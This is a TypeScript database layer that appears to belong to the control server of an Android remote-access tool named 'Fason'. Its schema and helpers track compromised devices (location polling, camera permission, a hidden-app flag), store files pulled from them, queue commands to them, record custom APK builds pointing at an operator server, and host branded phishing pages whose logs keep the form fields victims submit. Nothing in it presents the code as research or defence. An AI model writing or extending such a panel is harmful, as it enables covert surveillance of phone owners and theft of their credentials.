import crypto from 'crypto';
import Database from 'better-sqlite3';
import { drizzle } from 'drizzle-orm/better-sqlite3';
import { eq, and, desc, sql, count, lt, gt, inArray, or, ne, like } from 'drizzle-orm';
import * as schema from './schema.js';
import { paths, ensureDataDir } from '../config/paths.js';
import { log } from '../utils/logger.js';
import {
  user,
  session,
  account,
  clients,
  clientData,
  clientFiles,
  logs,
  buildRecords,
  settings,
  loginAttempts,
  commands,
  jwtSecret,
  phishingPages,
  phishingLogs,
} from './schema.js';
import { ALL_PERMISSIONS, DEFAULT_USER_PERMISSIONS, resolvePermissions } from '../types/index.js';
import type { Permission, UserRole } from '../types/index.js';

export type DB = ReturnType<typeof drizzle<typeof schema>>;
let dbInstance: DB | null = null;
let sqliteDb: Database.Database | null = null;
let logPruneCounter = 0;
let deviceSecretsCache: Map<string, string> | null = null;

export function getDb(): DB {
  if (!dbInstance) {
    throw new Error('Database not initialized. Call initDb() first.');
  }
  return dbInstance;
}

export function getSqliteDb(): Database.Database {
  if (!sqliteDb) {
    throw new Error('Database not initialized. Call initDb() first.');
  }
  return sqliteDb;
}

export function initDb(): DB {
  ensureDataDir();
  sqliteDb = new Database(paths.dbPath);
  sqliteDb.pragma('journal_mode = WAL');
  sqliteDb.pragma('foreign_keys = ON');
  sqliteDb.pragma('synchronous = NORMAL');
  sqliteDb.pragma('cache_size = -64000');
  sqliteDb.pragma('busy_timeout = 5000');
  sqliteDb.exec(`
    -- --- Better Auth tables ------------------------------------------------
    CREATE TABLE IF NOT EXISTS user (
      id TEXT PRIMARY KEY,
      email TEXT UNIQUE NOT NULL,
      email_verified INTEGER NOT NULL DEFAULT 0,
      name TEXT NOT NULL,
      image TEXT,
      created_at INTEGER NOT NULL,
      updated_at INTEGER NOT NULL,
      role TEXT NOT NULL DEFAULT 'user',
      banned INTEGER DEFAULT 0,
      ban_reason TEXT,
      ban_expires INTEGER,
      username TEXT NOT NULL DEFAULT '',
      permissions TEXT NOT NULL DEFAULT '[]',
      is_default INTEGER DEFAULT 0,
      last_login INTEGER,
      device_secret TEXT
    );
    CREATE TABLE IF NOT EXISTS session (
      id TEXT PRIMARY KEY,
      user_id TEXT NOT NULL,
      expires_at INTEGER NOT NULL,
      token TEXT UNIQUE NOT NULL,
      ip_address TEXT,
      user_agent TEXT,
      created_at INTEGER NOT NULL,
      updated_at INTEGER NOT NULL,
      impersonated_by TEXT,
      FOREIGN KEY (user_id) REFERENCES user(id) ON DELETE CASCADE
    );
    CREATE TABLE IF NOT EXISTS account (
      id TEXT PRIMARY KEY,
      provider_id TEXT NOT NULL,
      account_id TEXT NOT NULL,
      user_id TEXT NOT NULL,
      access_token TEXT,
      refresh_token TEXT,
      id_token TEXT,
      access_token_expires_at INTEGER,
      refresh_token_expires_at INTEGER,
      scope TEXT,
      password TEXT,
      created_at INTEGER NOT NULL,
      updated_at INTEGER NOT NULL,
      FOREIGN KEY (user_id) REFERENCES user(id) ON DELETE CASCADE
    );
    CREATE TABLE IF NOT EXISTS verification (
      id TEXT PRIMARY KEY,
      value TEXT NOT NULL,
      expires_at INTEGER NOT NULL,
      identifier TEXT NOT NULL,
      created_at INTEGER NOT NULL,
      updated_at INTEGER NOT NULL
    );
    -- --- Application tables ------------------------------------------------
    CREATE TABLE IF NOT EXISTS clients (
      id TEXT PRIMARY KEY,
      owner_id TEXT,
      ip TEXT DEFAULT '',
      country TEXT,
      city TEXT,
      timezone TEXT,
      first_seen TEXT DEFAULT (datetime('now')),
      last_seen TEXT DEFAULT (datetime('now')),
      online INTEGER DEFAULT 0,
      reconnect_count INTEGER DEFAULT 0,
      device_model TEXT,
      device_brand TEXT,
      device_version TEXT,
      fason_hidden INTEGER DEFAULT 0,
      camera_permission INTEGER DEFAULT 0,
      current_path TEXT DEFAULT '',
      gps_interval INTEGER DEFAULT 0,
      device_info TEXT
    );
    CREATE TABLE IF NOT EXISTS client_data (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      client_id TEXT NOT NULL,
      data_type TEXT NOT NULL,
      data TEXT DEFAULT '[]',
      updated_at TEXT DEFAULT (datetime('now')),
      UNIQUE(client_id, data_type),
      FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
    );
    CREATE TABLE IF NOT EXISTS client_files (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      client_id TEXT NOT NULL,
      file_type TEXT NOT NULL,
      original_name TEXT NOT NULL,
      mime_type TEXT,
      data BLOB NOT NULL,
      file_size INTEGER DEFAULT 0,
      created_at TEXT DEFAULT (datetime('now')),
      FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
    );
    CREATE TABLE IF NOT EXISTS logs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      type TEXT NOT NULL DEFAULT 'INFO',
      category TEXT NOT NULL DEFAULT 'SYSTEM',
      message TEXT NOT NULL,
      details TEXT,
      created_at TEXT DEFAULT (datetime('now'))
    );
    CREATE TABLE IF NOT EXISTS build_records (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id TEXT,
      server_url TEXT NOT NULL,
      home_page_url TEXT NOT NULL,
      app_name TEXT NOT NULL DEFAULT 'Fason',
      status TEXT DEFAULT 'pending',
      apk_data BLOB,
      file_size INTEGER DEFAULT 0,
      created_at TEXT DEFAULT (datetime('now')),
      completed_at TEXT
    );
    CREATE TABLE IF NOT EXISTS settings (
      key TEXT PRIMARY KEY,
      value TEXT NOT NULL,
      updated_at TEXT DEFAULT (datetime('now'))
    );
    CREATE TABLE IF NOT EXISTS login_attempts (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      ip TEXT NOT NULL,
      identifier TEXT NOT NULL DEFAULT '',
      attempted_at TEXT DEFAULT (datetime('now'))
    );
    CREATE TABLE IF NOT EXISTS jwt_secret (
      id INTEGER PRIMARY KEY CHECK (id = 1),
      secret TEXT NOT NULL
    );
    CREATE TABLE IF NOT EXISTS commands (
      id TEXT PRIMARY KEY,
      client_id TEXT NOT NULL,
      cmd_type TEXT NOT NULL,
      params TEXT DEFAULT '{}',
      status TEXT NOT NULL DEFAULT 'sent' CHECK(status IN ('sent', 'delivered', 'responded', 'failed')),
      sent_at TEXT NOT NULL DEFAULT (datetime('now')),
      delivered_at TEXT,
      responded_at TEXT,
      response_summary TEXT,
      FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
    );
    CREATE TABLE IF NOT EXISTS phishing_pages (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      slug TEXT NOT NULL UNIQUE,
      brand TEXT NOT NULL,
      category TEXT NOT NULL,
      variant TEXT NOT NULL,
      title TEXT NOT NULL,
      html TEXT NOT NULL,
      hits INTEGER NOT NULL DEFAULT 0,
      enabled INTEGER NOT NULL DEFAULT 1,
      created_by TEXT,
      created_at TEXT DEFAULT (datetime('now'))
    );
    CREATE TABLE IF NOT EXISTS phishing_logs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      page_id INTEGER,
      slug TEXT NOT NULL,
      brand TEXT NOT NULL,
      variant TEXT NOT NULL,
      ip TEXT NOT NULL DEFAULT '',
      user_agent TEXT NOT NULL DEFAULT '',
      fields TEXT NOT NULL DEFAULT '{}',
      meta TEXT NOT NULL DEFAULT '{}',
      created_at TEXT DEFAULT (datetime('now')),
      FOREIGN KEY (page_id) REFERENCES phishing_pages(id) ON DELETE CASCADE
    );
    CREATE INDEX IF NOT EXISTS idx_phishing_pages_category ON phishing_pages(category);
    CREATE INDEX IF NOT EXISTS idx_phishing_pages_enabled ON phishing_pages(enabled);
    CREATE INDEX IF NOT EXISTS idx_phishing_logs_page ON phishing_logs(page_id);
    CREATE INDEX IF NOT EXISTS idx_phishing_logs_slug ON phishing_logs(slug);
    CREATE INDEX IF NOT EXISTS idx_phishing_logs_created_at ON phishing_logs(created_at);
    CREATE INDEX IF NOT EXISTS idx_session_token ON session(token);
    CREATE INDEX IF NOT EXISTS idx_session_user_id ON session(user_id);
    CREATE INDEX IF NOT EXISTS idx_session_expires_at ON session(expires_at);
    CREATE INDEX IF NOT EXISTS idx_clients_online ON clients(online);
    CREATE INDEX IF NOT EXISTS idx_clients_last_seen ON clients(last_seen);
    CREATE INDEX IF NOT EXISTS idx_clients_owner_id ON clients(owner_id);
    CREATE INDEX IF NOT EXISTS idx_client_data_client_type ON client_data(client_id, data_type);
    CREATE INDEX IF NOT EXISTS idx_client_files_client ON client_files(client_id, file_type);
    CREATE INDEX IF NOT EXISTS idx_logs_type ON logs(type);
    CREATE INDEX IF NOT EXISTS idx_logs_category ON logs(category);
    CREATE INDEX IF NOT EXISTS idx_logs_created_at ON logs(created_at);
    CREATE INDEX IF NOT EXISTS idx_user_username ON user(username);
    CREATE INDEX IF NOT EXISTS idx_user_email ON user(email);
    CREATE INDEX IF NOT EXISTS idx_user_device_secret ON user(device_secret);
    CREATE INDEX IF NOT EXISTS idx_account_user_id ON account(user_id);
    CREATE INDEX IF NOT EXISTS idx_verification_identifier ON verification(identifier);
    CREATE INDEX IF NOT EXISTS idx_login_attempts_ip ON login_attempts(ip);
    CREATE INDEX IF NOT EXISTS idx_login_attempts_identifier ON login_attempts(identifier);
    CREATE INDEX IF NOT EXISTS idx_commands_client ON commands(client_id, cmd_type, status);
    CREATE INDEX IF NOT EXISTS idx_commands_sent_at ON commands(sent_at);
    CREATE INDEX IF NOT EXISTS idx_build_records_user_id ON build_records(user_id);
  `);
  try {
    const tableInfo = sqliteDb.pragma('table_info(client_files)') as Array<{ name: string }>;
    const columnNames = tableInfo.map((col) => col.name);
    if (columnNames.includes('file_path') && !columnNames.includes('data')) {
      log.info('Migrating client_files...');
      sqliteDb.exec(`DROP TABLE IF EXISTS client_files`);
      sqliteDb.exec(`
        CREATE TABLE client_files (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          client_id TEXT NOT NULL,
          file_type TEXT NOT NULL,
          original_name TEXT NOT NULL,
          mime_type TEXT,
          data BLOB NOT NULL,
          file_size INTEGER DEFAULT 0,
          created_at TEXT DEFAULT (datetime('now')),
          FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
        )
      `);
      sqliteDb.exec(`CREATE INDEX IF NOT EXISTS idx_client_files_client ON client_files(client_id, file_type)`);
      log.info('client_files migrated');
    }
  } catch (err: unknown) {
    log.warn(`client_files migration warning: ${err instanceof Error ? err.message : String(err)}`);
  }
  try {
    const tableInfo = sqliteDb.pragma('table_info(clients)') as Array<{ name: string }>;
    const columnNames = tableInfo.map((col) => col.name);
    if (!columnNames.includes('owner_id')) {
      sqliteDb.exec(`ALTER TABLE clients ADD COLUMN owner_id TEXT`);
      log.info('Added owner_id to clients');
    }
  } catch (err: unknown) {
    log.warn(`clients migration: ${err instanceof Error ? err.message : String(err)}`);
  }
  try {
    const tableInfo = sqliteDb.pragma('table_info(user)') as Array<{ name: string }>;
    const columnNames = tableInfo.map((col) => col.name);
    if (!columnNames.includes('device_secret')) {
      sqliteDb.exec(`ALTER TABLE user ADD COLUMN device_secret TEXT`);
      log.info('Added device_secret to users');
    }
  } catch (err: unknown) {
    log.warn(`user device_secret migration: ${err instanceof Error ? err.message : String(err)}`);
  }
  try {
    const tableInfo = sqliteDb.pragma('table_info(build_records)') as Array<{ name: string }>;
    const columnNames = tableInfo.map((col) => col.name);
    if (!columnNames.includes('user_id')) {
      sqliteDb.exec(`ALTER TABLE build_records ADD COLUMN user_id TEXT`);
      log.info('Added user_id to build_records');
    }
  } catch (err: unknown) {
    log.warn(`build_records user_id migration: ${err instanceof Error ? err.message : String(err)}`);
  }
  try {
    const legacyUsers = sqliteDb.prepare("SELECT name FROM sqlite_master WHERE type='table' AND name='users'").get();
    if (legacyUsers) {
      log.info('Dropping legacy tables...');
      sqliteDb.exec(`DROP TABLE IF EXISTS sessions`);
      sqliteDb.exec(`DROP TABLE IF EXISTS users`);
    }
  } catch (err: unknown) {
    log.warn(`Legacy table drop: ${err instanceof Error ? err.message : String(err)}`);
  }
  try {
    const tableInfo = sqliteDb.pragma('table_info(login_attempts)') as Array<{ name: string }>;
    const columnNames = tableInfo.map((col) => col.name);
    if (!columnNames.includes('identifier')) {
      sqliteDb.exec(`ALTER TABLE login_attempts ADD COLUMN identifier TEXT NOT NULL DEFAULT ''`);
      sqliteDb.exec(`CREATE INDEX IF NOT EXISTS idx_login_attempts_identifier ON login_attempts(identifier)`);
      log.info('Added identifier to login_attempts');
    }
  } catch (err: unknown) {
    log.warn(`login_attempts migration: ${err instanceof Error ? err.message : String(err)}`);
  }
  try {
    const tableInfo = sqliteDb.pragma('table_info(build_records)') as Array<{ name: string }>;
    const columnNames = tableInfo.map((col) => col.name);
    if (columnNames.includes('progress') && !columnNames.includes('apk_data')) {
      log.info('Migrating build_records...');
      sqliteDb.exec(`DROP TABLE IF EXISTS build_records`);
      sqliteDb.exec(`
        CREATE TABLE build_records (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          server_url TEXT NOT NULL,
          home_page_url TEXT NOT NULL,
          app_name TEXT NOT NULL DEFAULT 'Fason',
          status TEXT DEFAULT 'pending',
          apk_data BLOB,
          file_size INTEGER DEFAULT 0,
          created_at TEXT DEFAULT (datetime('now')),
          completed_at TEXT
        )
      `);
      log.info('build_records migrated');
    }
  } catch (err: unknown) {
    log.warn(`build_records migration: ${err instanceof Error ? err.message : String(err)}`);
  }
  dbInstance = drizzle(sqliteDb, { schema });
  return dbInstance;
}

export function closeDb(): void {
  if (sqliteDb) {
    sqliteDb.close();
    sqliteDb = null;
    dbInstance = null;
  }
}

export const dbHelpers = {
  getOrCreateClientData(clientId: string, dataType: string): string {
    const d = getDb();
    const row = d.select({ data: clientData.data })
      .from(clientData)
      .where(and(eq(clientData.clientId, clientId), eq(clientData.dataType, dataType)))
      .get();
    if (row) return row.data ?? '[]';
    d.insert(clientData).values({ clientId, dataType, data: '[]' })
      .onConflictDoNothing().run();
    const retry = d.select({ data: clientData.data })
      .from(clientData)
      .where(and(eq(clientData.clientId, clientId), eq(clientData.dataType, dataType)))
      .get();
    return retry?.data ?? '[]';
  },

  setClientData(clientId: string, dataType: string, data: string): void {
    getDb().insert(clientData).values({ clientId, dataType, data })
      .onConflictDoUpdate({
        target: [clientData.clientId, clientData.dataType],
        set: { data, updatedAt: new Date().toISOString() },
      }).run();
  },

  addClientFile(clientId: string, fileType: string, originalName: string, mimeType: string, data: Buffer, fileSize: number): void {
    const d = getDb();
    d.insert(clientFiles).values({
      clientId, fileType, originalName, mimeType, data, fileSize,
    }).run();
  },

  getClientFiles(clientId: string, fileType: string): Array<{
    id: number; originalName: string; mimeType: string | null; fileSize: number | null; createdAt: string | null; fileType: string;
  }> {
    const d = getDb();
    return d.select({
      id: clientFiles.id,
      originalName: clientFiles.originalName,
      mimeType: clientFiles.mimeType,
      fileSize: clientFiles.fileSize,
      createdAt: clientFiles.createdAt,
      fileType: clientFiles.fileType,
    })
      .from(clientFiles)
      .where(and(eq(clientFiles.clientId, clientId), eq(clientFiles.fileType, fileType)))
      .orderBy(desc(clientFiles.createdAt))
      .all();
  },

  addLog(type: string, category: string, message: string, details?: string): void {
    const d = getDb();
    d.insert(logs).values({ type, category, message, details: details || null }).run();
    logPruneCounter++;
    if (logPruneCounter >= 100) {
      logPruneCounter = 0;
      const cutoffRow = d.select({ createdAt: logs.createdAt })
        .from(logs)
        .orderBy(desc(logs.createdAt))
        .limit(1)
        .offset(9999)
        .all();
      if (cutoffRow.length > 0) {
        const cutoff = cutoffRow[0].createdAt;
        if (cutoff) d.delete(logs).where(lt(logs.createdAt, cutoff)).run();
      }
    }
  },

  cleanExpiredSessions(): number {
    const d = getDb();
    const now = new Date();
    const result = d.delete(session).where(lt(session.expiresAt, now)).run();
    return result.changes;
  },

  checkLoginAttempts(ip: string, maxAttempts: number, windowMs: number, identifier?: string): boolean {
    const d = getDb();
    const cutoff = new Date(Date.now() - windowMs).toISOString();
    const id = identifier || ip;
    const result = d.select({ count: count() })
      .from(loginAttempts)
      .where(and(eq(loginAttempts.identifier, id), gt(loginAttempts.attemptedAt, cutoff)))
      .get();
    return (result?.count ?? 0) >= maxAttempts;
  },

  recordLoginAttempt(ip: string, identifier?: string): void {
    const d = getDb();
    const id = identifier || ip;
    d.insert(loginAttempts).values({ ip, identifier: id }).run();
  },

  cleanLoginAttempts(olderThanMs: number): number {
    const d = getDb();
    const cutoff = new Date(Date.now() - olderThanMs).toISOString();
    const result = d.delete(loginAttempts).where(lt(loginAttempts.attemptedAt, cutoff)).run();
    return result.changes;
  },

  getOrCreateJwtSecret(): string {
    if (process.env.BETTER_AUTH_SECRET) return process.env.BETTER_AUTH_SECRET;
    try {
      const d = getDb();
      const row = d.select({ secret: jwtSecret.secret })
        .from(jwtSecret)
        .where(eq(jwtSecret.id, 1))
        .get();
      if (row?.secret && row.secret.length >= 32) return row.secret;
      const secret = crypto.randomBytes(48).toString('base64url');
      d.insert(jwtSecret).values({ id: 1, secret })
        .onConflictDoUpdate({ target: jwtSecret.id, set: { secret } }).run();
      return secret;
    } catch {
      log.error('No auth secret in DB, using ephemeral');
      return crypto.randomBytes(48).toString('base64url');
    }
  },

  getUserByUsernameOrEmail(identifier: string): typeof schema.user.$inferSelect | undefined {
    const d = getDb();
    const lowerIdent = identifier.toLowerCase();
    return d.select().from(user).where(
      or(
        eq(sql`LOWER(${user.username})`, lowerIdent),
        eq(sql`LOWER(${user.email})`, lowerIdent),
      )
    ).get();
  },

  getUserById(id: string): typeof schema.user.$inferSelect | undefined {
    const d = getDb();
    return d.select().from(user).where(eq(user.id, id)).get();
  },

  getAllUsers(): Array<typeof schema.user.$inferSelect> {
    const d = getDb();
    return d.select({
      id: user.id,
      email: user.email,
      emailVerified: user.emailVerified,
      name: user.name,
      image: user.image,
      createdAt: user.createdAt,
      updatedAt: user.updatedAt,
      role: user.role,
      banned: user.banned,
      banReason: user.banReason,
      banExpires: user.banExpires,
      username: user.username,
      permissions: user.permissions,
      isDefault: user.isDefault,
      lastLogin: user.lastLogin,
      deviceSecret: user.deviceSecret,
    }).from(user).orderBy(desc(user.createdAt)).all();
  },

  updateUser(id: string, data: { username?: string; email?: string; role?: 'admin' | 'user'; permissions?: string; isDefault?: number; lastLogin?: Date }): boolean {
    const d = getDb();
    const updates: Record<string, unknown> = { ...data, updatedAt: new Date() };

    const result = d.update(user).set(updates as any).where(eq(user.id, id)).run();
    return result.changes > 0;
  },

  updateUserPassword(userId: string, passwordHash: string): boolean {
    const d = getDb();
    const result = d.update(account).set({ password: passwordHash, updatedAt: new Date() })
      .where(and(eq(account.userId, userId), eq(account.providerId, 'credential'))).run();
    return result.changes > 0;
  },

  deleteUser(id: string): string[] {
    const d = getDb();
    const affectedDevices = d.select({ id: clients.id }).from(clients).where(eq(clients.ownerId, id)).all();
    getSqliteDb().transaction(() => {
      d.update(clients).set({ ownerId: null }).where(eq(clients.ownerId, id)).run();
      d.delete(buildRecords).where(eq(buildRecords.userId, id)).run();
      d.delete(user).where(eq(user.id, id)).run();
    })();
    deviceSecretsCache = null;
    return affectedDevices.map(d => d.id);
  },

  getAdminCount(): number {
    const d = getDb();
    const result = d.select({ count: count() }).from(user).where(eq(user.role, 'admin')).get();
    return result?.count ?? 0;
  },

  getUserPermissions(id: string): Permission[] {
    const d = getDb();
    const row = d.select({ role: user.role, permissions: user.permissions }).from(user).where(eq(user.id, id)).get();
    if (!row) return [];
    return resolvePermissions(row.role as UserRole, row.permissions);
  },

  getUserSessions(userId: string): Array<typeof schema.session.$inferSelect> {
    const d = getDb();
    const now = new Date();
    return d.select().from(session)
      .where(and(eq(session.userId, userId), gt(session.expiresAt, now)))
      .orderBy(desc(session.createdAt))
      .all();
  },

  getSessionByToken(token: string): typeof schema.session.$inferSelect | null {
    const d = getDb();
    const row = d.select().from(session).where(eq(session.token, token)).get();
    if (!row) return null;
    const expiresAt = row.expiresAt instanceof Date ? row.expiresAt : new Date(row.expiresAt as any);
    if (expiresAt < new Date()) {
      d.delete(session).where(eq(session.id, row.id)).run();
      return null;
    }
    return row;
  },

  deleteSessionById(sessionId: string): boolean {
    const d = getDb();
    const result = d.delete(session).where(eq(session.id, sessionId)).run();
    return result.changes > 0;
  },

  deleteOtherSessions(userId: string, keepToken: string): number {
    const d = getDb();
    const result = d.delete(session)
      .where(and(eq(session.userId, userId), ne(session.token, keepToken)))
      .run();
    return result.changes;
  },

  createCommand(id: string, clientId: string, cmdType: string, params: string): void {
    getDb().insert(commands).values({ id, clientId, cmdType, params, status: 'sent' }).run();
  },

  updateCommandStatus(id: string, status: 'delivered' | 'responded' | 'failed', summary?: string): void {
    const updates: Record<string, unknown> = { status };
    if (status === 'delivered') updates.deliveredAt = new Date().toISOString();
    if (status === 'responded') {
      updates.respondedAt = new Date().toISOString();
      if (summary) updates.responseSummary = summary;
    }
    getDb().update(commands).set(updates).where(eq(commands.id, id)).run();
  },

  getPendingCommandForClient(clientId: string, cmdType: string): { id: string; status: string } | undefined {
    const d = getDb();
    return d.select({ id: commands.id, status: commands.status })
      .from(commands)
      .where(and(eq(commands.clientId, clientId), eq(commands.cmdType, cmdType), inArray(commands.status, ['sent', 'delivered'])))
      .orderBy(desc(commands.sentAt))
      .limit(1)
      .get();
  },

  markAllPendingCommandsResponded(clientId: string, cmdType: string, summary?: string): string[] {
    const d = getDb();
    const pending = d.select({ id: commands.id })
      .from(commands)
      .where(and(eq(commands.clientId, clientId), eq(commands.cmdType, cmdType), inArray(commands.status, ['sent', 'delivered'])))
      .all();
    if (pending.length === 0) return [];
    const ids = pending.map((p) => p.id);
    const nowIso = new Date().toISOString();
    d.update(commands).set({
      status: 'responded',
      respondedAt: nowIso,
      responseSummary: summary ?? null,
    }).where(and(
      eq(commands.clientId, clientId),
      eq(commands.cmdType, cmdType),
      inArray(commands.id, ids),
    )).run();
    return ids;
  },

  markCommandResponded(commandId: string, summary?: string): boolean {
    const d = getDb();
    const nowIso = new Date().toISOString();
    const result = d.update(commands).set({
      status: 'responded',
      respondedAt: nowIso,
      responseSummary: summary ?? null,
    }).where(eq(commands.id, commandId)).run();
    return result.changes > 0;
  },

  cleanOldCommands(maxAgeMs: number = 24 * 60 * 60 * 1000): number {
    const d = getDb();
    const cutoff = new Date(Date.now() - maxAgeMs).toISOString();
    const result = d.delete(commands).where(lt(commands.sentAt, cutoff)).run();
    return result.changes;
  },

  assignDevice(clientId: string, ownerId: string): boolean {
    const d = getDb();
    const result = d.update(clients).set({ ownerId }).where(eq(clients.id, clientId)).run();
    return result.changes > 0;
  },

  unassignDevice(clientId: string): boolean {
    const d = getDb();
    const result = d.update(clients).set({ ownerId: null }).where(eq(clients.id, clientId)).run();
    return result.changes > 0;
  },

  getDeviceOwnerId(clientId: string): string | null {
    const d = getDb();
    const row = d.select({ ownerId: clients.ownerId }).from(clients).where(eq(clients.id, clientId)).get();
    return row?.ownerId ?? null;
  },

  getOrCreateUserDeviceSecret(userId: string): string {
    const d = getDb();
    const row = d.select({ deviceSecret: user.deviceSecret }).from(user).where(eq(user.id, userId)).get();
    if (row?.deviceSecret) {
      if (deviceSecretsCache) deviceSecretsCache.set(userId, row.deviceSecret);
      return row.deviceSecret;
    }
    const secret = crypto.randomBytes(24).toString('base64url');
    d.update(user).set({ deviceSecret: secret, updatedAt: new Date() }).where(eq(user.id, userId)).run();
    if (deviceSecretsCache) deviceSecretsCache.set(userId, secret);
    return secret;
  },

  getAllDeviceSecrets(): Array<{ userId: string; deviceSecret: string }> {
    if (deviceSecretsCache) {
      return Array.from(deviceSecretsCache.entries()).map(([userId, deviceSecret]) => ({ userId, deviceSecret }));
    }
    const d = getDb();
    const rows = d.select({ userId: user.id, deviceSecret: user.deviceSecret })
      .from(user)
      .all()
      .filter((r): r is { userId: string; deviceSecret: string } => !!r.deviceSecret);
    deviceSecretsCache = new Map(rows.map(r => [r.userId, r.deviceSecret]));
    return rows;
  },

  invalidateDeviceSecretsCache(): void {
    deviceSecretsCache = null;
  },
};
